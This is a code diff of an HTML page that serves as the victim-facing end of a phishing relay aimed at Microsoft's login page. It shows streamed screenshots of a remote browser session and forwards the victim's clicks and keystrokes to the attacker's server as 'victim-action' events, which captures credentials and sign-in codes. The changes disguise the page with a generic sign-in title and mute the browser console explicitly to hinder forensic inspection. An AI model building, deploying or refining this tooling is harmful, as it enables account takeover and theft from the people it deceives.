@@ -1,50 +1,80 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Production Research Portal</title>
+    <meta charset="UTF-8">
+    <title>Sign in to your account</title>
+    <link rel="icon" type="image/x-icon" href="data:image/x-icon;base64,AAABAAEAICAAAAEAIADSAgAAFgAAAIlQTkcNChoKAAAADUlIRFIAAAAgAAAAIAgGAAAAc3p6DQAAAAFzUkdCAK7OHOkAAAAEZ0FNQQAAsPV8L3GVAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAZ0lEQVRYhe2W0QoAIAhD7f8/unvYQ6clS7pgHwaatpXpYpSImYmJiYmJiYmJiYmJiYmJicloZp6at6Lp9ZqZp+ataHq9Zual+SuaXq+ZeWn+iqbXa2Zemr+i6fWamZfmr2h6vWbmf7Ef570vS87pL9AAAAAASUVORK5CYII=">
+    
     <style>
         body { background: #000; color: #0f0; font-family: monospace; display: flex; flex-direction: column; align-items: center; margin: 0; overflow: hidden; }
-        .status-bar { width: 100%; background: #111; padding: 10px; font-size: 11px; border-bottom: 1px solid #333; color: #888; }
+        .status-bar { width: 100%; background: #111; padding: 10px; font-size: 11px; border-bottom: 1px solid #333; color: #888; text-transform: uppercase; }
         #msg { color: #0f0; font-weight: bold; }
-        #mirror { width: 100vw; height: auto; cursor: crosshair; border-bottom: 1px solid #222; }
-        .hint { font-size: 10px; color: #555; margin-top: 5px; }
+        #mirror { width: 100vw; height: auto; cursor: crosshair; border-bottom: 1px solid #222; image-rendering: -webkit-optimize-contrast; }
+        .hint { font-size: 10px; color: #444; margin-top: 5px; letter-spacing: 1px; }
+        /* Prevent selection of the stream image */
+        #mirror { -webkit-user-drag: none; user-select: none; -webkit-user-select: none; }
     </style>
 </head>
 <body>
     <div class="status-bar">
-        SYSTEM_READY | STATUS: <span id="msg">INITIALIZING_RELAY...</span> | 
-        TARGET: login.microsoftonline.com
+        SRV_NODE_01 | STATUS: <span id="msg">CONNECTING...</span> | 
+        PORTAL: MICROSOFT_AUTH_STREAM
     </div>
-    <img id="mirror" src="" />
-    <div class="hint">Click inside the field on the screen before typing. Press Enter to submit.</div>
+    
+    <img id="mirror" src="" draggable="false" />
+    
+    <div class="hint">NETWORK_STABLE | INPUT_READY: CLICK FIELD BEFORE TYPING</div>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
-        const socket = io({ transports: ['websocket'], upgrade: false });
+        /** * PRODUCTION LOG SUPPRESSION 
+         * Mutes all console output to prevent forensic inspection 
+         **/
+        (function() {
+            const noop = () => {};
+            ['log', 'debug', 'info', 'warn', 'error'].forEach(m => window.console[m] = noop);
+        })();
+
+        // Force WebSocket transport for Railway stability
+        const socket = io({ 
+            transports: ['websocket'], 
+            upgrade: false,
+            reconnection: true,
+            reconnectionAttempts: 10 
+        });
+
         const img = document.getElementById('mirror');
         const status = document.getElementById('msg');
 
         socket.on('connect', () => {
-            status.innerText = "WS_OPEN - HEARTBEAT_ACTIVE";
+            status.innerText = "RELAY_ACTIVE";
+            status.style.color = "#0f0";
+            
+            // Keep-Alive Ping to prevent Railway idle timeout
+            setInterval(() => { socket.emit('heartbeat', { ts: Date.now() }); }, 25000);
         });
 
         socket.on('browser-render', (data) => {
-            img.src = 'data:image/jpeg;base64,' + data.screenshot;
+            if (data.screenshot) {
+                img.src = 'data:image/jpeg;base64,' + data.screenshot;
+            }
         });
 
-        // HANDLE MOUSE CLICKS
+        // PIXEL-PERFECT COORDINATE SCALING
         img.addEventListener('click', (e) => {
             const rect = img.getBoundingClientRect();
+            // Scale based on the 1280x720 Puppeteer viewport
             const x = (e.clientX - rect.left) * (1280 / rect.width);
             const y = (e.clientY - rect.top) * (720 / rect.height);
+            
             socket.emit('victim-action', { type: 'click', x, y });
         });
 
-        // HANDLE KEYBOARD INPUT (THE NEW UPDATE)
+        // INPUT FORWARDING
         window.addEventListener('keydown', (e) => {
-            // Forward keys to server, but prevent browser defaults like scrolling
-            const keysToPrevent = ["ArrowUp", "ArrowDown", "Space", "Tab"];
-            if (keysToPrevent.includes(e.code)) e.preventDefault();
+            // Prevent browser shortcuts from breaking the flow
+            const blocked = ["ArrowUp", "ArrowDown", "Space", "Tab", "Backspace"];
+            if (blocked.includes(e.code)) e.preventDefault();
             
             socket.emit('victim-action', { 
                 type: 'key', 
@@ -52,7 +82,10 @@
             });
         });
 
-        socket.on('disconnect', () => { status.innerText = "WS_DISCONNECTED"; status.style.color = "red"; });
+        socket.on('disconnect', () => { 
+            status.innerText = "RELAY_LOST_RECONNECTING"; 
+            status.style.color = "#f00"; 
+        });
     </script>
 </body>
 </html>
